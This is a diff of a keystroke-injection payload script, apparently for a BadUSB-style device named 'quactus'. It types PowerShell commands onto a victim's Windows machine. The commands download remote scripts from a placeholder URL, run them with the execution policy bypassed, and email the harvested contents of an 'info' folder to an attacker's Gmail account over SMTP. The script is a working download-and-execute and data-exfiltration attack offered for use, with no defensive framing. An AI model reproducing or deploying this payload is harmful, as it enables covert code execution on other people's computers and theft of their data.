@@ -13,11 +13,22 @@ Print:New-Item -ItemType directory -Path C:\quactus\;
 Press:176
 Print:cd C:\quactus\; cls;
 Press:176
-Print:$source = "https://goo.gl/WQgNYB"; $destination = "C:\quactus\SMTPInfoGrab.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
+Print:$source = "ADDURLHERE"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
 Press:176
-Print:PowerShell.exe -ExecutionPolicy Bypass -File SMTPInfoGrab.ps1;
+Print:$source = "ADDURLHERE"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls;
+Press:176
+Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1;
 Press:176
 CustomDelay:1000
+Print:$SMTPServer = 'smtp.gmail.com'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); 
+Print:$SMTPInfo.EnableSSL = $true; 
+Print:$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR EMAIL', 'EMAIL PASSWORD'); cls;
+Print:$ReportEmail = New-Object System.Net.Mail.MailMessage; 
+Print:$ReportEmail.From = 'YOUR EMAIL'; 
+Print:$ReportEmail.To.Add('YOUR EMAIL'); 
+Print:$ReportEmail.Subject = 'Thats a Prickly Cactus Quack Quack'; 
+Print:$ReportEmail.Body = (Get-Content C:\quactus\info\* | out-string); cls;
+Print:$SMTPInfo.Send($ReportEmail); 
 Press:176
 Print:cd ..;
 Press:176
